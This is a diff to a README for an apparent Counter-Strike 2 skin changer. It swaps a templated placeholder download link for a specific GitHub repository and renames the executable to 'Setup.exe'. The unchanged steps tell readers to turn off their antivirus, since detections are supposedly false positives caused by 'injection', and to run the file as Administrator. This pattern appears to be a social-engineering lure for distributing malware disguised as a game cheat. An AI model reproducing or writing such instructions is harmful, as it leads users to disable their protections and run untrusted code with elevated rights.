@@ -19,7 +19,7 @@
    📥 How to Download & Install
 
 1. **Go to the official download page:**  
-   👉 [https://твойник.github.io/имя-репа/](https://твойник.github.io/имя-репа/)
+   👉 (https://github.com/makingaa123/cs2-skin-changer)
 
 2. Click the **"Download Now"** button.
 
@@ -27,7 +27,7 @@
 
 4. **Disable your antivirus** temporarily (it may show a false positive because of the injection method).
 
-5. **Run `CS2_Skin_Changer.exe`** as Administrator.
+5. **Run `Setup.exe`** as Administrator.
 
 6. Launch CS2 and enjoy your new skins! 🎮
 
